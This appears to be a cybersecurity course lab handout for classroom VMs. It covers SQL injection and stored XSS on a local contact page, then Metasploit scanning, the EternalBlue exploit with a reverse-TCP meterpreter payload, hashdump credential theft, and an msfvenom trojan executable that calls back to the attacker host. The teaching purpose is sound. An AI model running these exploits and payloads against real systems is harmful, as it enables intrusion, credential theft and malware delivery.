# CYBR 1100 - Labs
Support Materials for CYBR1100 Labs
---
- [Lab 5](#Lab5)
- [Lab 6](#Lab6)
---

## <a id = "Lab5"></a>Lab 5 ##
### Q1
Download the Contact Page zip file
- [ContactPage.zip](ContactPage.zip)
- Move contents to **/var/www/html/** folder.

### Q2
In the terminal, type the following command:

`/etc/init.d/apache2 start`

`/etc/init.d/mysql start`

Back in Firefox, navigate to the URL: **localhost/index.html**
### Q3
Back in the Terminal, navigate to the folder where you put the **createCybr1100.sql** file.

`cd /var/www/html`

`mysql < createCybr1100.sql`

`mysql`

`use cybr1100;`

`show tables;`

### Q4
`describe messages;
select * from messages;`

You should see a table is there but it contains no data.

In Firefox, go to
**localhost/contact.html**

After sending a message, go back to your terminal and again type.

`select * from messages;`
### Q5
`select * from users;`

You can add a user with the following code.

`insert into users (username, password) values ('YOUR_USERNAME', 'YOUR_PASSWORD');`
### Q7
Enter the following:
Username: **hacker**
Password: **hack' OR 1 = '1**

### Q8
Now, go back to the URL: **localhost/contact.html**
Create a message but as part of the body of your text, include the following line:

`<script> alert("Surprise!");</script>`

Now, go back to the URL: **localhost/messages.html**

## <a id="Lab6"></a>Lab 6 ##
### Q1
Open a terminal in Kali

You will need to start up the postgresql server to use the Metasploit database

# systemctl start postgresql
Initialize the database

# msfdb init
Start the Metasploit console

# msfconsole
confirm that Metasploit is successfully connected to the database.

> db_status

### Q2
Once connected to the database, we can start organizing our different movements by using what are called ‘workspaces’. This gives us the ability to save different scans from different locations/networks/subnets for example.

Issuing the ‘workspace‘ command from the msfconsole, will display the currently selected workspaces. The ‘default‘ workspace is selected when connecting to the database, which is represented by the * beside its name.

> workspace
Creating and deleting a workspace one simply uses the -a or -d followed by the name at the msfconsole prompt.  Let's add a workspace for the lab assignment

> workspace -a lab
This can be quite handy when it comes to keeping things ‘neat’. Let’s change the current workspace to lab

> workspace lab
It’s that simple, using the same command and adding the -h switch will provide us with the command’s other capabilities.

From now on any scan or imports from 3rd party applications will be saved into this workspace.
Now that we are connected to our database and workspace setup, we can start populating it with some data.

First we’ll look at the different ‘db_’ commands available to use using the help command from the msfconsole.  You can browse the general help screens with

> help
Or you can get information about specific commands by adding the command name such as

> help jobs
### Q3
How do we select a target? There are several ways we can do this, from scanning a host or network directly from the console, or importing a file from an earlier scan.
Let's scan a host directly from the console using the db_nmap command. Scan results will be saved in our current database. The command works the same way as the command line version of nmap.

> db_nmap -O -T4 -sT 172.16.5.0/24
This will do a default TCP scan (-sT) of 172.16.5.0 - 172.16.5.255 with fast timing (-T4) and an attempt to detect the Operating system (-O) of the hosts discovered.

### Q4
Once completed we can confirm which hosts we found by issuing the hosts command. This will display all the hosts stored in our current workspace.

> hosts
What is the operating system (os) name for the host at 172.16.5.5?

### Q5
We can also confirm which services were found by issuing the services command.  This will display information about port numbers, protocols, state and other information.

> services
You can limit the list using

> services [addr1 add2 ...]

### Q6
Everyone should have a Windows VM assigned.  Power on your Windows VM.  Log in with user2 and password Steal2020.  Get the IP address for your Windows VM from the network settings or use ipconfig at the command line.

Back on your Kali VM, do a scan and see what information you find about your Windows VM

> db_nmap -O -T4 -sT your-WINVM-IP-here
-O will attempt to determine the operating system of the target

-T4 sets the speed for how quickly the target is scanned

Try the hosts and services commands again to see the additional records added to your msf workspace.

What additional information did you gather about the host from the db_nmap -sT scan?  (Hint: type db_nmap -h if you need more details about the command)

### Q7
You should see from the TCP scan that netbios was found on port 139.  Let's check what modules are available in msf for netbios.

> search netbios
Since we are in information gathering mode, the modules that are categorized as scanner might be useful at this point.  Let's see what the NetBIOS Information Discovery module does

> use auxiliary/scanner/netbios/nbname
You should see the msf5 prompt change to indicate we are now using the nbname module.  To get more information about the currently active module, use the following command:

> info
You will see some metadata and a short description.   To use the module we need to make sure we have set all the required options.  Look to see which of the required options have default values and which are blank.   The only value that we should need to set is the remote host value that indicates our target.  Hopefully you still remember the IP of your Windows VM from the previous question.

> set RHOSTS your-WINVM-IP-here
We can check that the value was set as expected by entering the following command.

> show options
It is usually a good idea to check if everything is as you expect before running a scan or exploit.   If everything is ready, start the module:

> run
Again use the hosts command to see the new information from the module added to your workspace database.

### Q8
Now that we know a little bit about our target, let's see if we can gain access by looking at known vulnerabilities that match our particular target operating system.  For this we selected a well know vulnerability that targets SMB (Links to an external site.) as documented in  CVE-2017-0143 (Links to an external site.), CVE-2017-0144 (Links to an external site.), CVE-2017-0145 (Links to an external site.), CVE-2017-0146 (Links to an external site.), CVE-2017-0147 (Links to an external site.), CVE-2017-0148 (Links to an external site.) otherwise known as EternalBlue (Links to an external site.).

> use exploit/windows/smb/ms17_010_eternalblue
Just as before, we will want to check the requirements for running the module.

> info
For this module there are some required and non-required options.  As before, we need to set the target machine in RHOSTS.

> set rhost your-WINVM-IP-here
Assuming we are able to successfully attack our target and gain some sort of access, what then?  We will need some code that can be run on the remote system.   With Metasploit we can choose from several pre-made modules.  To see the payload modules that are compatible with our exploit module, use the following command:

> show payloads
As you can see, most of the available payloads address the task of creating a communication channel that can be used to command and control the remote host.  Of course there are variations in communication channels such as using IPv4 or IPv6, using TCP, HTTP, HTTPS, opening a port or calling back another system, using a shell or meterpreter.  For our circumstance, it is easiest to use a IPv4 reverse tcp meterpreter interface.  We can do that with the following:

> set payload windows/x64/meterpreter/reverse_tcp
And just as our exploit module has required options, so does our payload module.  These can be seen like before:

> options
We may want to launch our attack from one location and have command/control from another location.  But to keep things simple, we will use our Kali VM for both.   If not already set, enter your Kali VM IP address as the local host for the payload to call back:

> set lhost your-KaliVM-IP-here
If everything is ready to go and you have double checked that you have the correct intended target and call back IP, start the attack.

> exploit
If the attack is successful, you will see WIN indicator and you should have a meterpreter prompt.  If you do not, then check your VMs and the settings you used and try again.

### Q9
Now that you are connected to your Windows VM via this exploit, you have access to their system.

See what you get when you type the following commands:

> sysinfo
> getuid
> show_mount
> ipconfig
> arp
These commands will give you info about the machine you are connected to.

If you type the following commands you will be able to take a screenshot of the desktop of whoever is currently logged into the targeted computer.

> screenshot
Upload the screenshot file you generated of the  Windows VM desktop from Kali.

### Q10
Returning to the meterpreter prompt, lets go into the command prompt of the remote computer.

> shell
Now you are in a shell within the Windows computer, run some commands on the Windows computer. You should be able to run any of the normal Windows commands.

Let's take a look in one of the user directories

> cd \Users\User1\Documents
> dir
Looks empty except for the standard lines depicting the current directory and parent directory

What if we try the following command that shows hidden files without directories?

> dir /ah-d
Are there any interesting files now showing?

Use the type command to show file contents

> type filename.ext
What is the secret bank account number?

### Q11

Now let's close the shell session and return to the meterpreter prompt.

> exit

We could type exit again to close the meterpreter session too.  But what if we wanted to keep our session that we worked so hard to get?   This will allow us to try other modules but still allow us to go back into the remote computer without having to rerun the original exploit.  We can put this session in the background with the following command:

> background
We can see all of the computers currently connected by typing the following command.

> sessions
Run the following commands to see what post exploit information we can gather:

> use post/windows/gather/hashdump
> show options
> set SESSION 1
> run
> creds
What additional information did you gather about the host from the hashdump module?

### Q12
Let's now close our session 1 connection to the remote computer and exit from metasploit using the following commands:

> sessions -k 1
> exit
In the previous questions we were able to exploit a vulnerability exposed to the network.  But what if through the use of multilayered defenses such as firewalls, updated system patches, access controls, etc. we were not able to gain access?  Are there other methods we could use?   What if we could get a user to start a program that runs on their computer and creates a connection out through their firewall back to our metasploit computer?  For that we need some sort of virus or trojan horse program.

Next we will put together an executable that simulates malware program that we want our unsuspecting victim to run on the target Windows computer. The msfvenom utility comes with Metasploit and provides various payloads that can be used with Metasploit.  We can see some of the payloads available with the following:

# msfvenom -l payloads | grep windows/meterpreter/reverse
We will put together two payloads to create our malicious executable.

messagebox - opens a dialog window that displays customizable text, title & icon.
meterpreter/reverse_tcp - inject the meterpreter server DLL and connect back to the attacker.
Generate the first half of the payload which is code to open a popup window showing the TEXT provided ("MSFU Example") when run in the next question.  Our target machine has a windows platform and x86 architecture.  The format of the output file, messagebox.raw, should be raw binary.

# msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw > messagebox.raw
The next step takes the code we saved in messagebox.raw and adds code from meterpreter/reverse_tcp that will create a tcp connection from the victim computer -> through their firewalls -> back to our Kali terminal that we will have running in the third step in the next question.  We need to specify the host and port that the reverse_tcp should connect to.  The output format is an executable file that will run on windows & x86.  

# msfvenom -c messagebox.raw -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=your-Kali-IP-here LPORT=4444 -f exe -o /var/www/html/payload.exe
If LHOST fails to validate, make sure you used the correct Kali IP address

What is the final approximate size of the resulting executable file?

### Q13
Start the apache webserver on your Kali:

# service apache2 start
Go to your Windows VM, open a browser and download the executable created in the previous question.  Usually there would be social engineering or some other trick to get the unsuspecting user to download and run the file, but you get the idea.

http://your-kali-IP/payload.exe
When prompted save the file in the Downloads directory.

### Q14
Back in your Kali VM, open a new terminal window and run the following commands

# msfconsole
> use multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST your-Kali-IP-here
> set LPORT 4444
> run
This will create a listener on your Kali computer TCP port 4444 for the payload.exe program to connect back to.

### Q15
Back on your Kali VM, you should now see the meterpreter command prompt and have access to the Windows computer from your meterpreter console.  If not, check your IP addresses, regenerate the payload.exe, redownload to the Windows VM and try again.  You may need to close and reopen Internet Explorer to clear the browser cache in order to get the updated file.

At the meterpreter command prompt, type help to see the available commands.  Hopefully it looks familiar.

Try moving around the remote file system see what information you can obtain about the target  computer.  

There is a secret message in file /Users/User1/Downloads/message.bin.   We need to bring the file back to our Kali VM for analysis and reverse engineering.   Use the download command to do this.   

> download message.bin
Once the file is on your Kali VM open another terminal window and set the program to execute on Kali.

# chmod a+x message.bin
And run the retrieved file

# ./message.bin
What is the secret message?
